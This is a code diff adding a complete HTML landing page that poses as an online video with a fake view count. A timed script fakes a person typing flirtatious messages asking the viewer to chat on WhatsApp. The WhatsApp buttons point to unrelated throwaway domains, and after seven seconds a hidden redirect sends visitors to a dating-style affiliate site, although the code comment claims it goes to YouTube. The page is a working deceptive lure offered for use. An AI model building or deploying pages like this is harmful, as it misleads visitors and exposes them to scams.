@@ -1,0 +1,115 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=2652aa3b-b2dc-408a-a957-e950d09d3b67
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>🟢𝗢𝗡𝗟𝗜𝗡𝗘</title>
+
+  <!-- ⭐ THUMBNAIL  ⭐ -->
+  <meta property="og:title" content="▶️2:43―●―――――41:52 👁229.6k+">
+  <meta property="og:image" content="https://carera-28m.pages.dev/jleb.png">
+
+
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { background: #000; font-family: Arial, sans-serif; overflow-x: hidden; color: white; }
+
+    /* FULLSCREEN VIDEO */
+    #videoContainer { position: fixed; top: 0; left: 0; width: 100%; height: 100vh; overflow: hidden; }
+    video { width: 100%; height: 100%; object-fit: cover; background: black; }
+
+    /* CTA */
+    .cta-box { position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.8); padding: 20px; text-align: center; transform: translateY(100%); transition: 0.4s; }
+    .cta-box.show { transform: translateY(0); }
+    .title { font-size: 22px; margin-bottom: 10px; font-weight: bold; }
+
+    .btn-whatsapp { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 16px; background: #25D366; color: white; border-radius: 12px; font-size: 20px; font-weight: bold; text-decoration: none; }
+    .btn-whatsapp img { width: 28px; height: 28px; }
+
+    /* Floating WhatsApp Logo */
+    .whatsapp-float { position: fixed; bottom: 90px; right: 18px; width: 65px; height: 65px; background: #25D366; border-radius: 50%; display: flex; align-items: center; justify-content: center; z-index: 9999; box-shadow: 0 4px 12px rgba(0,0,0,0.4); cursor: pointer; animation: pulse 1.5s infinite; }
+    .whatsapp-float img { width: 38px; height: 38px; }
+    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.13); } 100% { transform: scale(1); } }
+
+    /* FAKE CHAT */
+    #fakeChat { position: fixed; bottom: 130px; left: 12px; max-width: 80%; display: none; flex-direction: column; gap: 10px; z-index: 20; }
+    .bubble { background: rgba(255,255,255,0.18); padding: 10px 14px; border-radius: 16px; backdrop-filter: blur(3px); animation: fadeIn .4s ease; font-size: 15px; }
+    .typing { width: 60px; padding: 8px 12px; background: rgba(255,255,255,0.18); border-radius: 16px; }
+    .typing span { width: 8px; height: 8px; background: white; border-radius: 50%; display: inline-block; margin: 0 2px; animation: blink 1s infinite; }
+    @keyframes blink { 0%{opacity:.2;}50%{opacity:1;}100%{opacity:.2;} }
+    @keyframes fadeIn { from{opacity:0;} to{opacity:1;} }
+  </style>
+</head>
+
+<body>
+
+  <!-- FULLSCREEN VIDEO -->
+  <div id="videoContainer">
+    <video id="randomVideo" autoplay muted loop playsinline
+      poster="https://ik.imagekit.io/d4owg9gc6/GettyImages-1203053827.webp?updatedAt=1765289941742"></video>
+  </div>
+
+  <!-- FLOATING WHATSAPP BUTTON -->
+  <a href="https://i8qkr.christina-henricks.com/s-tvalbp"
+    target="_blank" class="whatsapp-float">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
+  </a>
+
+  <!-- FAKE CHAT -->
+  <div id="fakeChat"></div>
+
+  <!-- CTA BOX -->
+  <div class="cta-box" id="ctaBox">
+    <div class="title">🔥 Ready to Chat on WhatsApp?</div>
+    <a class="btn-whatsapp"
+      href="https://ihxz3.sharoon-davies.com/s-1km3rvf"
+      target="_blank">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg"> Start Chat on WhatsApp
+    </a>
+  </div>
+
+  <script>
+    const videoList = [
+      "https://ik.imagekit.io/tpl29q1vf/DrearyWateryAntelopegroundsquirrel.mp4",
+      "https://ik.imagekit.io/click/PMxHA75GykN7frwS.mp4",
+      "https://ik.imagekit.io/ytn5rysnn/2video.mp4"
+    ];
+
+    const video = document.getElementById("randomVideo");
+    function loadRandomVideo() {
+      let pick = Math.floor(Math.random() * videoList.length);
+      video.src = videoList[pick];
+      video.load();
+      video.play().catch(() => { video.muted = true; video.play(); });
+    }
+    video.onerror = function () { loadRandomVideo(); };
+    window.addEventListener("load", loadRandomVideo);
+
+    const chat = document.getElementById("fakeChat");
+    const messages = [
+      "Hey 👀 are you here?",
+      "I want to chat with you...",
+      "Can you message me on WhatsApp?"
+    ];
+
+    setTimeout(() => { chat.style.display = "flex"; }, 1500);
+    setTimeout(() => { chat.innerHTML = `<div class="typing"><span></span><span></span><span></span></div>`; }, 2000);
+    setTimeout(() => { chat.innerHTML = `<div class="bubble">${messages[0]}</div>`; }, 3800);
+    setTimeout(() => { chat.innerHTML += `<div class="bubble">${messages[1]}</div>`; }, 5500);
+    setTimeout(() => { chat.innerHTML += `<div class="bubble">${messages[2]}</div>`; }, 7200);
+
+    setTimeout(() => { document.getElementById("ctaBox").classList.add("show"); }, 3500);
+	
+	        // Redirect ke YouTube setelah 5 detik
+        setTimeout(function() {
+            window.location.href = "https://mrvraz.hotterdattes.com/?utm_source=da57dc555e50572d&ban=inst&j1=1&j8=1&s1=157586&s2=2242721&s3=KANJENG&click_id=S0FOSkVORyxDQSwxNDIuOTMuMTc2LjE4OSxXRUIsSU1PTkVUSVpFSVQ";
+        }, 7000);	
+  </script>
+
+</body>
+</html>
